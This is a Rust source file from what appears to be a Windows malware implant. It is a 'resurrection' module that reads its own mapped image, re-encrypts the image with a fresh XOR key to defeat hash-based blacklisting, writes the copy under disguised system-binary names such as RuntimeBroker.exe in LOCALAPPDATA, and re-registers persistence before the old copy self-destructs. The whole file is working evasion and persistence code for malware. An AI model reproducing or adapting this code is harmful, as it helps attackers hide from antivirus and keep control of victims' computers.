//! resurrect.rs — copy + re-schedule self to a new path with a new hash
//!
//! Called by watchdog.rs just before selfdestruct.
//!
//! What it does:
//!   1. Read our own binary bytes from memory (from the mapped image — not disk,
//!      since the watchdog may have already started wiping disk)
//!   2. XOR-re-encrypt with a freshly generated key so the new copy has a
//!      different hash than the original (kills hash-based blacklisting)
//!   3. Write to a randomised path in one of: %APPDATA%, %LOCALAPPDATA%,
//!      %TEMP%, or masquerading as a Windows system binary name
//!   4. Re-register persistence (same technique as persist.rs) pointing to
//!      the new path
//!   5. Return — caller (watchdog) then calls selfdestruct on the current copy
//!
//! Net result: current binary vanishes, new binary appears at different path
//! with different hash, persistence entry updated, implant survives the scan.

use std::fs;
use std::path::PathBuf;
use winapi::um::{
    libloaderapi::GetModuleHandleW,
    sysinfoapi::GetTickCount,
};

/// Drop a re-keyed copy of ourselves and register persistence for it.
pub unsafe fn drop_and_schedule(old_key: &[u8; 16]) {
    let new_path = choose_resurrection_path();
    let new_key  = fresh_key();

    // Read our own PE from the mapped image base
    let own_bytes = read_own_image();
    if own_bytes.is_empty() { return; }

    // Re-XOR with new key so hash is completely different
    let mut new_bytes = own_bytes.clone();
    // Decode with old key first (payload section only — stub approach)
    // For a full impl, store the encrypted payload offset in a header struct.
    // Here we XOR the whole image as a quick re-keying.
    for (i, b) in new_bytes.iter_mut().enumerate() {
        *b = (*b ^ old_key[i % 16]) ^ new_key[i % 16];
    }

    // Write new copy
    if fs::write(&new_path, &new_bytes).is_ok() {
        // Register persistence pointing to new path
        crate::persist::install(new_path.to_str().unwrap_or(""));
    }
}

unsafe fn read_own_image() -> Vec<u8> {
    // Get our own mapped base via GetModuleHandle(NULL)
    let base = GetModuleHandleW(std::ptr::null()) as *const u8;
    if base.is_null() { return Vec::new(); }
    // Read PE size from Optional Header SizeOfImage
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D { return Vec::new(); }
    let nt = base.add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let size = (*nt).OptionalHeader.SizeOfImage as usize;
    std::slice::from_raw_parts(base, size).to_vec()
}

fn choose_resurrection_path() -> PathBuf {
    // Rotate through disguise locations
    let ticks = unsafe { GetTickCount() };
    let disguise_names = [
        "RuntimeBroker.exe",
        "SearchIndexer.exe",
        "TabTip.exe",
        "WmiPrvSE.exe",
        "SppExtComObj.exe",
    ];
    let name = disguise_names[(ticks as usize) % disguise_names.len()];
    let base = std::env::var("LOCALAPPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| std::env::temp_dir());
    base.join("Microsoft").join("Windows").join(name)
}

fn fresh_key() -> [u8; 16] {
    let mut k = [0u8; 16];
    unsafe {
        // CryptGenRandom for true randomness
        let mut h_prov: winapi::um::wincrypt::HCRYPTPROV = 0;
        winapi::um::wincrypt::CryptAcquireContextW(
            &mut h_prov, std::ptr::null(), std::ptr::null(),
            winapi::um::wincrypt::PROV_RSA_FULL,
            winapi::um::wincrypt::CRYPT_VERIFYCONTEXT,
        );
        winapi::um::wincrypt::CryptGenRandom(h_prov, 16, k.as_mut_ptr());
        winapi::um::wincrypt::CryptReleaseContext(h_prov, 0);
    }
    k
}
